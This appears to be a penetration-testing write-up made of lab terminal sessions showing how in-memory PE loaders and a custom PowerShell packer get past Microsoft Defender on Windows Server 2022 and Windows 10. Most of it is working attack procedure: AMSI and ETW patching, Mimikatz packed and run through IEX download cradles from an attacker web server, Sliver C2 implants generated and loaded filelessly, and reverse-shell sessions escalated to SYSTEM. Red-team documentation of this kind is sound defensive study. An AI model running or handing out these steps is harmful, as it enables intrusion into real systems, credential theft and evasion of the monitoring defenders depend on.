-a----        12/12/2022  11:41 PM         928112 msvcp140d.dll


PS C:\Users\Administrator\Documents\InMemoryNetv2> .\InMemoryNetv2.exe http://192.168.1.144:8080/Rubeus.exe currentluid
[-] Failed to load amsi.dll
[+] Patched etw!
[+] Patched amsi!
[+] Patched amsi open session!
 ~ Execute Remote .NET Assembly ~

[+] Loading Remote PE from http://192.168.1.144:8080/Rubeus.exe
[+] Bytes: 467456
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Display current LUID

[*] Current LogonID (LUID) : 0x2e937b (3052411)

PS C:\Users\Administrator\Documents\InMemoryNetv2>


PS C:\Users\Administrator\Documents\InMemoryNetv2> InMemoryNetv2.exe http://192.168.1.144:8080/Seatbelt.exe -group=remote
[-] Failed to load amsi.dll
[+] Patched etw!
[+] Patched amsi!
[+] Patched amsi open session!
 ~ Execute Remote .NET Assembly ~

[+] Loading Remote PE from http://192.168.1.144:8080/Seatbelt.exe
[+] Bytes: 608256

                        %&&@@@&&
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
                        &%%&&&%%%%%        v1.2.2         ,(((&%%%%%%%%%%%%%%%%%,
                         #%%%%##,

====== AMSIProviders ======

  GUID                           : {2781761E-28E0-4109-99FE-B9D127C57AFE}
  ProviderPath                   : "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.2-0\MpOav.dll"

====== AntiVirus ======

Cannot enumerate antivirus. root\SecurityCenter2 WMI namespace is not available on Windows Servers
====== AuditPolicyRegistry ======

<SNIP>


===================================================================================================================================================
VII.   Tools that bypass AV products and allow to load and execute straight in-memory offensive PE files (un-managed code like C/C++ programs)
===================================================================================================================================================

There are many open-source tools on GitHub that allow to load and execute straight in-memory offensive PE files from a remote web server URL 
or from a local directory.

Examples of tools
------------------
➤ RunPE			      	  - https://github.com/nettitude/RunPE
➤ Pyramid		       	  - https://github.com/naksyn/Pyramid
➤ FilelessPELoader	      - https://github.com/SaadAhla/FilelessPELoader
➤ Invoke-PoSH-PePacker	  - https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/Invoke-PoSH-PePacker
➤ FilelessRemotePE	      - https://github.com/ASkyeye/FilelessRemotePE
➤ DojoLoader		      - https://github.com/naksyn/DojoLoader
➤ ...


***************************************************************************************************************************************************
➤ Test 1 - PoC with my packer 'Invoke-PoSH-PePacker' on a Windows server 2022 protected by the MS Defender antivirus
            -> Download and execute in-memory hacking tools without being detected by AV products
***************************************************************************************************************************************************

> 'Invoke-PoSH-PePacker' allows to pack and encrypt offensive PE files in order to bypass AV solutions such as Windows Defender.
   It generates an obfuscated and encrypted PowerShell script that contains the PE file that you want to pack.

> https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/Invoke-PoSH-PePacker

> FEATURES
  - AES encryption and GZip/Deflate compression (based on 'Xencrypt')
  - Reflective PE injection (based on an updated version of 'Invoke-ReflectivePEInjection')
  - AMSI bypass (pseudo random)
  - Blocking Event Tracing (ETW) for Windows (i.e. disable script-block logging within current PoSH process)
  - Disabling PowerShell history logging
  - Basic sandbox evasion techniques (optional)
    + stop/exit if the PowerShell script is not run on a domain-joined Windows computer
    + wait for 60 seconds before execution

--------------------------------------------------------------------------------------------------
Step 1 - Generate a PowerShell script that embeded the hacking tool 'Mimikatz'
         (note: during this step, I disabled temporarily my AV on my attacker Windows laptop)
--------------------------------------------------------------------------------------------------

PS C:\Temp > IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Jean-Francois-C/Windows-Penetration-Testing/master/Defense%20evasion%20(examples)/
             Invoke-PoSH-PePacker/Invoke-PoSH-PePacker.ps1');

  ___ ___    ___        _
 | _ \ __|__| _ \__  __| |_____ _ _
 |  _/ _|___|  _/ _|/ _| / / -_)  _|
 |_| |___|  |_| \__,\__|_\_\___|_|
                                   v1.4

Usage:
> Import-Module ./Invoke-PoSH-PePacker.ps1
> Invoke-PoSH-PePacker -FileUrl https://URL/PE-file.exe -OutFile C:\path\Packed-PE-file.ps1
> Invoke-PoSH-PePacker -FilePath C:\path\PE-file.exe -OutFile C:\path\Packed-PE-file.ps1

Features:
[*] AES encryption and GZip/Deflate compression (based on 'Xencrypt')
[*] Reflective PE injection (based on an updated version of 'Invoke-ReflectivePEInjection')
[*] AMSI bypass
[*] Blocking Event Tracing for Windows (ETW)
[*] Disabling PowerShell history logging
[*] Basic sandbox evasion techniques (optional -sandbox)


PS C:\Temp> Invoke-PoSH-PePacker -FileUrl http://192.168.1.144:8080/mimikatz.exe -Outfile C:\Temp\packed-mimi2025.ps1

[*] Downloading the remote PE file: 'http://192.168.1.144:8080/mimikatz.exe'
[*] Creating the reflective PE file injection script
[*] File compression (GZip/Deflate)
[*] File encryption (AES)
[*] Adding 'A'M'S'I' bypass
[*] Adding 'E'T'W' bypass
[*] Disabling PoSh history logging
[*] The obfuscated & encrypted PE file loader script has been saved: 'C:\Temp\packed-mimi2025.ps1' ...
[+] Done!

PS C:\Temp>

--------------------------------------------------------------------------------------------------------------------------
Step 2 - Download and execute straight into memory the PowerShell script (that embed Mimikatz) on a Windows server 2022 
	 without being detected nor blocked by the Microsoft Defender Antivirus 
         (AMSI bypass, Reflective PE injection, Disabling PowerShell history logging, ...)
--------------------------------------------------------------------------------------------------------------------------

PS C:\Users\Administrator> systeminfo

Host Name:                 SERVER-WIN2022
OS Name:                   Microsoft Windows Server 2022 Standard Evaluation
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00454-40000-00001-AA898
Original Install Date:     5/2/2025, 10:44:40 AM
System Boot Time:          5/26/2025, 11:26:53 AM
<SNIP>

PS C:\Users\Administrator>  Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated|FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 5/26/2025 6:31:01 AM


PS C:\Users\Administrator> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.144:8080/packed-mimi2025.ps1');

PS C:\Users\Administrator> Execute-PE Coffee

VERBOSE: PowerShell ProcessID: 1188
VERBOSE: Calling Invoke-MemoryLoadLibrary
VERBOSE: Getting basic PE information from the file
VERBOSE: Allocating memory for the PE and write its headers to memory
VERBOSE: Getting detailed PE information from the headers loaded in memory
VERBOSE: StartAddress: 0x000001E31A8B0000    EndAddress: 0x000001E31AA21000
VERBOSE: Copy PE sections in to memory
VERBOSE: Update memory addresses based on where the PE was actually loaded in memory
VERBOSE: Import DLL's needed by the PE we are loading
VERBOSE: Done importing DLL imports
VERBOSE: Update memory protection flags
VERBOSE: Call EXE Main function. Address: 0x000001E31A9744D0. Creating thread for the EXE to run in.

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 28 2024 17:42:39
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # Coffee

    ( (
     ) )
  .______.
  |      |]
  \      /
   `----'

mimikatz #
mimikatz # exit
Bye!
VERBOSE: EXE thread has completed.
VERBOSE: Done!

PS C:\Users\Administrator>


***************************************************************************************************************************************************
➤ Test 2 - PoC with the tool 'FilelessPELoader' on a Windows 10 laptop protected by the MS Defender antivirus
            -> Download and execute in-memory hacking tools without being detected by AV products
***************************************************************************************************************************************************

The tool "FilelessPELoader" allows to load and execute directly into memory an encrypted remote Portable Executable (PE).
=> Source: https://github.com/TheD1rkMtr/FilelessPELoader

Notes regarding AV detection
-----------------------------
This loader works well however during my tests well-known hacking tools such as "Mimikatz.exe" or meterpreter shells were detected & blocked by Windows Defender.


--------------------------------------------------------------------------------------------------------------------------
Step 1 - Download, obfuscate and compile the source code of the tool 'FilelessPELoader'
--------------------------------------------------------------------------------------------------------------------------

C:\Users\jfc\Documents\Tools-Pentest\1-Antivirus-bypass\FilelessPELoader-main>dir
 Volume in drive C is Windows
 Volume Serial Number is F06E-DC58

 Directory of C:\Users\jfc\Documents\Tools-Pentest\1-Antivirus-bypass\FilelessPELoader-main

02/11/2023  06:34 PM    <DIR>          .
02/11/2023  06:34 PM    <DIR>          ..
02/11/2023  06:34 PM               967 aes.py
03/19/2023  09:20 PM    <DIR>          FilelessPELoader
02/11/2023  06:34 PM         1,250,056 mimikatz.exe
02/11/2023  06:34 PM               565 README.md
               3 File(s)      1,251,588 bytes
               3 Dir(s)  248,797,466,624 bytes free


C:\Users\jfc\Documents\Tools-Pentest\1-Antivirus-bypass\FilelessPELoader-main\FilelessPELoader\x64\Release>dir
 Volume in drive C is Windows
 Volume Serial Number is F06E-DC58

 Directory of C:\Users\jfc\Documents\Tools-Pentest\1-Antivirus-bypass\FilelessPELoader-main\FilelessPELoader\x64\Release

03/19/2023  11:21 PM    <DIR>          .
03/19/2023  11:21 PM    <DIR>          ..
03/19/2023  09:20 PM            20,992 FilelessPELoader.exe
03/19/2023  09:20 PM               373 FilelessPELoader.exe.recipe
03/19/2023  09:20 PM           183,194 FilelessPELoader.iobj
03/19/2023  09:20 PM            86,544 FilelessPELoader.ipdb
03/19/2023  09:20 PM             2,197 FilelessPELoader.log
03/19/2023  09:20 PM           385,500 FilelessPELoader.obj
03/19/2023  09:20 PM           667,648 FilelessPELoader.pdb
03/19/2023  09:20 PM    <DIR>          FilelessPELoader.tlog
03/19/2023  09:20 PM               132 FilelessPELoader.vcxproj.FileListAbsolute.txt
03/19/2023  09:20 PM           208,896 vc142.pdb
               9 File(s)      1,555,476 bytes
               3 Dir(s)  248,799,092,736 bytes free


--------------------------------------------------------------------------------------------------------------------------
Step 2 - Generate a SLIVER C2 https reverse shell and encrypt it with the python script 'aes.py'
--------------------------------------------------------------------------------------------------------------------------

jeff@kali:~/Documents/Tools/SLiver-C2$ sudo sliver-server
[*] Loaded 17 aliases from disk
[*] Loaded 16 extension(s) from disk

.------..------..------..------..------..------.
|S.--. ||L.--. ||I.--. ||V.--. ||E.--. ||R.--. |
| :/\: || :/\: || (\/) || :(): || (\/) || :(): |
| :\/: || (__) || :\/: || ()() || :\/: || ()() |
| '--'S|| '--'L|| '--'I|| '--'V|| '--'E|| '--'R|
`------'`------'`------'`------'`------'`------'

All hackers gain reinforce
[*] Server v1.5.31 - kali
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

[server] sliver > generate --arch amd64 -f exe --http 192.168.1.30 --save /home/jeff/Documents/Tools/SLiver-C2/SliverShell.exe --os Windows
[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 1m5s
[*] Implant saved to /home/jeff/Documents/Tools/SLiver-C2/SliverShell.exe


jeff@kali:~/Documents/Tools/FilelessPELoader-main$ sudo chmod 764 /home/jeff/Documents/Tools/SLiver-C2/SliverShell.exe

jeff@kali:~/Documents/Tools/FilelessPELoader-main$ cp /home/jeff/Documents/Tools/SLiver-C2/SliverShell.exe ./

jeff@kali:~/Documents/Tools/FilelessPELoader-main$ ls
aes.py  cipher.bin  FilelessPELoader  key.bin  mimikatz.exe  README.md  shell.exe  SliverShell.exe

jeff@kali:~/Documents/Tools/FilelessPELoader-main$ sudo python3 aes.py SliverShell.exe 

jeff@kali:~/Documents/Tools/FilelessPELoader-main$ ls -al
total 38368
drwxr-xr-x  3 jeff jeff     4096 Mar 19 23:31 .
drwxr-xr-x 61 jeff jeff     4096 Mar 19 22:48 ..
-rwxr-xr-x  1 jeff jeff      967 Mar 19 22:53 aes.py
-rw-r--r--  1 root root 18570768 Mar 19 23:31 cipher.bin
drwxr-xr-x  2 jeff jeff     4096 Feb 11 18:34 FilelessPELoader
-rw-r--r--  1 root root       16 Mar 19 23:31 key.bin
-rw-r--r--  1 jeff jeff  1250056 Feb 11 18:34 mimikatz.exe
-rw-r--r--  1 jeff jeff      565 Feb 11 18:34 README.md
-rw-r--r--  1 jeff jeff   207872 Mar 19 23:21 shell.exe
-rwxr--r--  1 jeff jeff 18570752 Mar 19 23:31 SliverShell.exe

jeff@kali:~/Documents/Tools/FilelessPELoader-main$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...


--------------------------------------------------------------------------------------------------------------------------
Step 3 - Download & execute (in-memory) the encrypted SLiver C2 implant using the tool 'FilelessPELoader'
--------------------------------------------------------------------------------------------------------------------------

C:\Temp>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Temp> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 3/19/2023 10:28:59 AM

PS C:\Users\Administrator> cmd
Microsoft Windows [Version 10.0.14393]
(c) Microsoft Corporation. All rights reserved.

c:\Users\Administrator> cd C:\temp
c:\temp>

C:\Temp>.\FilelessPELoader.exe 192.168.1.30 8080 cipher.bin key.bin

[+] Get AES Encrypted PE from 192.168.1.30:8080
[+] Get AES Key from 192.168.1.30:8080
[+] AES PE Address : 0000020BE07D7040
[+] AES Key Address : 0000020BDE728720
[+] Decrypt the PE
[+] PE Decrypted
[+] Loading and Running PE

---------------------------------------------------------------------------------------------------------------------------------
Step 4 - Enjoy the SLIVER C2 reverse shell running on the target Windows 10 laptop without being detected by the MS Defender AV
---------------------------------------------------------------------------------------------------------------------------------

[server] sliver > https --lhost 192.168.1.30 --lport 443

[*] Starting HTTPS :443 listener ...

[*] Successfully started job #1

[*] Session f7e6fcb7 ROUND_CRIMINAL - 192.168.1.144:58771 (PO744653) - windows/amd64 - Sun, 19 Mar 2023 23:32:49 CET

[server] sliver > sessions

 ID         Transport   Remote Address        Hostname   Username     Operating System   Health  
========== =========== ===================== ========== ============ ================== =========
 f7e6fcb7   http(s)     192.168.1.144:58771   PO744653   LAB\jfc   windows/amd64      [ALIVE] 

[server] sliver > sessions f7e6fcb7
error: invalid usage of command 'sessions' (unconsumed input 'f7e6fcb7'), try 'help'
[server] sliver > sessions -i f7e6fcb7

[*] Active session ROUND_CRIMINAL (f7e6fcb7)

[server] sliver (ROUND_CRIMINAL) > getuid

S-1-5-21-666114207-261065646-224150901-1121

[server] sliver (ROUND_CRIMINAL) > whoami

Logon ID: LAB\jfc
[*] Current Token ID: LAB\jfc
[server] sliver (ROUND_CRIMINAL) >  

<SNIP>


***************************************************************************************************************************************************
➤ Test 3 - PoC with the tool 'FilelessRemotePE' on a Windows 2022 server protected by the MS Defender antivirus
            -> Download and execute in-memory hacking tools without being detected by AV products
***************************************************************************************************************************************************

> Source: https://github.com/ASkyeye/FilelessRemotePE

The tool "FilelessRemotePE" allows to load directly into memory remote Portable Executable (PE) files with:
> argument passing
> ETW patching
> NTDLL unhooking
> no new thread technique

Limitation: It runs only c/c++/asm based binaries.

--------------------------------------------------------------------------------------------------------------------------
Step 1 - Download, obfuscate and compile the source code of the tool 'FilelessRemotePE'
--------------------------------------------------------------------------------------------------------------------------

> Github - https://github.com/ASkyeye/FilelessRemotePE

I named my obfuscated version of the tool "RemotePe-v0.exe".


--------------------------------------------------------------------------------------------------------------------------
Step 2 - Generate a SLIVER C2 https reverse shell and start a listener
--------------------------------------------------------------------------------------------------------------------------

┌──(kali㉿kali)-[~]
└─$ sudo sliver-server
[sudo] password for kali:

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain jump-start
[*] Server v1.5.42 - kali
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command


[server] sliver > generate --arch amd64 -f exe --http 192.168.1.147 --save /home/kali/Documents/Tools/SliverRevShell1.exe --os Windows

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 33s
[*] Implant saved to /home/kali/Documents/Tools/SliverRevShell1.exe


[server] sliver > https --lhost 192.168.1.147 --lport 443

[*] Starting HTTPS :443 listener ...
[*] Successfully started job #1

---------------------------------------------------------------------------------------------------------------------------------------
Step 3 - Download and execute the tool 'FilelessRemotePE' (in this PoC renamed as 'RemotePe-v0.exe') on a target Windows server 2022
         protected by the MS Defender AV
---------------------------------------------------------------------------------------------------------------------------------------

Microsoft Windows [Version 10.0.20348.3932]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator> systeminfo

Host Name:                 SERVER-WIN2022
OS Name:                   Microsoft Windows Server 2022 Standard Evaluation
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
<SNIP>

C:\Users\Administrator> powershell -c "Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,
                                       AntivirusSIgnatureLastUpdated|FL"

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSIgnatureLastUpdated : 8/11/2025 11:53:05 AM

C:\Users\Administrator>cd C:\temp

C:\temp> powershell -c "wget -uri http://192.168.1.144:8080/RemotePe-V0.exe -OutFile C:\temp\RemotePe-v0.exe"

C:\temp> powershell -c "wget -uri http://192.168.1.23:8080/vcruntime140_1.dll -OutFile C:\temp\vcruntime140_1.dll"

C:\temp> powershell -c "wget -uri http://192.168.1.23:8080/msvcp140.dll -OutFile C:\temp\msvcp140.dll"

C:\temp> echo http://192.168.1.23:8080/SliverRevShell1.exe | RemotePe-v0.exe

[+] Unhooking

[+] Patch ETW

[+] Enter the uri :

[+] Loading Remote PE from http://192.168.1.23:8080/SliverRevShell1.exe

[+] Run PE


------------------------------------------------------------------------------------------------------------------------------------
Step 4 - Enjoy the SLIVER C2 reverse shell running on the target Windows server 2022 (without being detected by the MS Defender AV)
------------------------------------------------------------------------------------------------------------------------------------


[server] sliver >

[*] Session 4932a377 JUDICIAL_SHEATH - 192.168.1.25:49780 (Server-Win2022) - windows/amd64 - Mon, 11 Aug 2025 20:25:48 EDT

[server] sliver > sessions

 ID         Name              Transport   Remote Address       Hostname         Username                       Operating System   Locale   Last Message                            Health
========== ================= =========== ==================== ================ ============================== ================== ======== ======================================= =========
 4932a377   JUDICIAL_SHEATH   http(s)     192.168.1.25:49780   Server-Win2022   SERVER-WIN2022\Administrator   windows/amd64      en-US    Mon Aug 11 20:26:42 EDT 2025 (0s ago)   [ALIVE]

[server] sliver > sessions -i 4932a377

[*] Active session JUDICIAL_SHEATH (4932a377)

[server] sliver (JUDICIAL_SHEATH) > info

        Session ID: 4932a377-5820-4133-902d-d9d7867405ad
              Name: JUDICIAL_SHEATH
          Hostname: Server-Win2022
              UUID: 7f5cf82a-0437-4773-84b0-599f0a2c0b48
          Username: SERVER-WIN2022\Administrator
               UID: S-1-5-21-3336774573-1234467604-3718094125-500
               GID: S-1-5-21-3336774573-1234467604-3718094125-513
               PID: 660
                OS: windows
           Version: Server 2016 build 20348 x86_64
            Locale: en-US
              Arch: amd64
         Active C2: https://192.168.1.147
    Remote Address: 192.168.1.25:49780
         Proxy URL:
Reconnect Interval: 1m0s
     First Contact: Mon Aug 11 20:25:48 EDT 2025 (1m43s ago)
      Last Checkin: Mon Aug 11 20:27:30 EDT 2025 (1s ago)

[server] sliver (JUDICIAL_SHEATH) >

[server] sliver (JUDICIAL_SHEATH) > getuid

S-1-5-21-3336774573-1234467604-3718094125-500

[server] sliver (JUDICIAL_SHEATH) > pwd

[*] C:\temp

[server] sliver (JUDICIAL_SHEATH) > ps

 Pid    Ppid   Owner                          Arch     Executable                    Session
====== ====== ============================== ======== ============================= =========
 0      0                                              [System Process]              -1
 4      0                                     x86_64   System                        0
 100    4                                     x86_64   Registry                      0
 304    4                                     x86_64   smss.exe                      0
 404    396                                            csrss.exe                     -1
 476    396                                   x86_64   wininit.exe                   0
 484    468                                            csrss.exe                     -1
 548    468                                   x86_64   winlogon.exe                  1
 616    476                                   x86_64   services.exe                  0

? [1/3] Continue? No

⚠️  Security Product(s): Windows Defender, Windows Smart Screen

[server] sliver (JUDICIAL_SHEATH) >

[server] sliver (JUDICIAL_SHEATH) > getsystem

[*] A new SYSTEM session should pop soon...

[*] Session 394487ad JUDICIAL_SHEATH - 192.168.1.25:49966 (Server-Win2022) - windows/amd64 - Mon, 11 Aug 2025 20:35:08 EDT


[server] sliver (JUDICIAL_SHEATH) > background

[*] Background ...


[server] sliver > sessions -i 394487ad

[*] Active session JUDICIAL_SHEATH (394487ad)

[server] sliver (JUDICIAL_SHEATH) > whoami

Logon ID: NT AUTHORITY\SYSTEM
[*] Current Token ID: NT AUTHORITY\SYSTEM

<SNIP>


***************************************************************************************************************************************************
➤ Test 4 - PoC with the tool 'DojoLoader' on a Windows 2022 server protected by the MS Defender antivirus
            -> Download and execute in-memory hacking tools without being detected by AV products
***************************************************************************************************************************************************

> Source: https://github.com/naksyn/DojoLoader

DojoLoader is a generic PE loader initially created to prototype sleep obfuscation techniques with Cobalt Strike UDRL-less raw Beacon payload,
in an attempt to reduce debugging time with UDRLs.

DojoLoader borrows MemoryModule implementation of the tool 'DynamicDllLoader' (https://gitlab.com/ORCA000/dynamicdllloader) project by ORCA000 and
expands on that adding modularity and the following features:
1. Download and execution of (xored) shellcode from HTTP or from file
2. Dynamic IAT hooking for Sleep function
3. Three different Sleep obfuscation techinques implemented in the hook library
   > 'RW->RX' sleep obfuscation 
   > 'MemoryBouncing' sleep obfuscation 
   > 'MemoryHopping' sleep obfuscation  


--------------------------------------------------------------------------------------------------------------------------
Step 1 - Download, obfuscate and compile the source code of the tool 'DojoLoader'
--------------------------------------------------------------------------------------------------------------------------

> Github - https://github.com/naksyn/DojoLoader

I named my obfuscated version of the tool "Dojo2judo.exe".

--------------------------------------------------------------------------------------------------------------------------
Step 2 - Generate a SLIVER C2 https reverse shell and start a listener
--------------------------------------------------------------------------------------------------------------------------

┌──(kali㉿kali)-[~]
└─$ sudo sliver-server
[sudo] password for kali:

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain jump-start
[*] Server v1.5.42 - kali
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command


[server] sliver > generate --arch amd64 -f exe -l --http 192.168.1.147 --save /home/kali/Documents/Tools/SliverRevShell2.exe --os Windows

[*] Generating new windows/amd64 implant binary
[!] Symbol obfuscation is disabled
[*] Build completed in 2s
[*] Implant saved to /home/kali/Documents/Tools/SliverRevShell2.exe


[server] sliver > https --lhost 192.168.1.147 --lport 443

[*] Starting HTTPS :443 listener ...
[*] Successfully started job #1

---------------------------------------------------------------------------------------------------------------------------------------
Step 3 - Download and execute the tool 'DojoLoader' (in this PoC renamed as 'Dojo2judo.exe') on a target Windows server 2022
         protected by the MS Defender AV
---------------------------------------------------------------------------------------------------------------------------------------

Microsoft Windows [Version 10.0.20348.3932]
(c) Microsoft Corporation. All rights reserved.

C:\temp> powershell -c "Get-ComputerInfo | Select WindowsProductName"

WindowsProductName
------------------
Windows Server 2022 Standard Evaluation


C:\temp> powershell -c "Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled, AntivirusSIgnatureLastUpdated|FL"

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSIgnatureLastUpdated : 8/12/2025 20:15:45 PM


C:\temp> powershell -c "wget -uri http://192.168.1.23:8080/Dojo2judo.exe -OutFile C:\temp\Dojo2judo.exe"


=> Run the tool to download and execute the Sliver C2 reverse shell (SliverRevShell2.exe)
------------------------------------------------------------------------------------------

C:\temp> Dojo2judo.exe -d http://192.168.1.23:8080/SliverRevShell2.exe -s 3
0: Dojo2judo.exe
1: -d
2: http://192.168.1.23:8080/SliverRevShell2.exe
3: -s
4: 3
______      _       _                     _
|  _  \    (_)     | |                   | |
| | | |___  _  ___ | |     ___   __ _  __| | ___ _ __
| | | / _ \| |/ _ \| |    / _ \ / _` |/ _` |/ _ \ '__|
| |/ / (_) | | (_) | |___| (_) | (_| | (_| |  __/ |
|___/ \___/| |\___/\_____ \___/ \__,_|\__,_|\___|_|
          _/ |
         |__/

Author: @naksyn

URL: http://192.168.1.23:8080/SliverRevShell2.exe
[+] Buffer allocated at address: 000002136D476070
[+] Running
[+] Saved RX memory pointer address: 0x401000 and size 0x4fe200
[+] no delta detected from address: 0x400000
[+] Function Name: WriteFile, Address: 00007FFF616A42A0
[+] Written to IAT at address: 0000000000E17560
[+] Function Name: WriteConsoleW, Address: 00007FFF616A46C0
[+] Written to IAT at address: 0000000000E17568
[+] Function Name: WaitForMultipleObjects, Address: 00007FFF616A3D60
[+] Written to IAT at address: 0000000000E17570
[+] Function Name: WaitForSingleObject, Address: 00007FFF616A3D80
[+] Written to IAT at address: 0000000000E17578
[+] Function Name: VirtualQuery, Address: 00007FFF6169C040
[+] Written to IAT at address: 0000000000E17580
[+] Function Name: VirtualFree, Address: 00007FFF6169BD70
[+] Written to IAT at address: 0000000000E17588
[+] Function Name: VirtualAlloc, Address: 00007FFF6169AB20
[+] Written to IAT at address: 0000000000E17590
[+] Function Name: TlsAlloc, Address: 00007FFF6169D1D0
[+] Written to IAT at address: 0000000000E17598
[+] Function Name: SwitchToThread, Address: 00007FFF6169B1C0
[+] Written to IAT at address: 0000000000E175A0
[+] Function Name: SuspendThread, Address: 00007FFF616A0E10
[+] Written to IAT at address: 0000000000E175A8
[+] Function Name: SetWaitableTimer, Address: 00007FFF616A3D40
[+] Written to IAT at address: 0000000000E175B0
[+] Function Name: SetUnhandledExceptionFilter, Address: 00007FFF6169FA40
[+] Written to IAT at address: 0000000000E175B8
[+] Function Name: SetProcessPriorityBoost, Address: 00007FFF616817C0
[+] Written to IAT at address: 0000000000E175C0
[+] Function Name: SetEvent, Address: 00007FFF616A3D30
[+] Written to IAT at address: 0000000000E175C8
[+] Function Name: SetErrorMode, Address: 00007FFF6169BF50
[+] Written to IAT at address: 0000000000E175D0
[+] Function Name: SetConsoleCtrlHandler, Address: 00007FFF616A4690
[+] Written to IAT at address: 0000000000E175D8
[+] Function Name: ResumeThread, Address: 00007FFF6169E010
[+] Written to IAT at address: 0000000000E175E0
[+] Function Name: PostQueuedCompletionStatus, Address: 00007FFF6169BC40
[+] Written to IAT at address: 0000000000E175E8
[+] Function Name: LoadLibraryA, Address: 00007FFF616A0650
[+] Written to IAT at address: 0000000000E175F0
[+] Function Name: LoadLibraryW, Address: 00007FFF6169FB30
[+] Written to IAT at address: 0000000000E175F8
[+] Function Name: SetThreadContext, Address: 00007FFF616BAD50
[+] Written to IAT at address: 0000000000E17600
[+] Function Name: GetThreadContext, Address: 00007FFF616A0D70
[+] Written to IAT at address: 0000000000E17608
[+] Function Name: GetSystemInfo, Address: 00007FFF6169D690
[+] Written to IAT at address: 0000000000E17610
[+] Function Name: GetSystemDirectoryA, Address: 00007FFF6169DB30
[+] Written to IAT at address: 0000000000E17618
[+] Function Name: GetStdHandle, Address: 00007FFF6169D330
[+] Written to IAT at address: 0000000000E17620
[+] Function Name: GetQueuedCompletionStatusEx, Address: 00007FFF616A7310
[+] Written to IAT at address: 0000000000E17628
[+] Function Name: GetProcessAffinityMask, Address: 00007FFF6169C3B0
[+] Written to IAT at address: 0000000000E17630
[+] Function Name: GetProcAddress, Address: 00007FFF6169AA50
[+] Written to IAT at address: 0000000000E17638
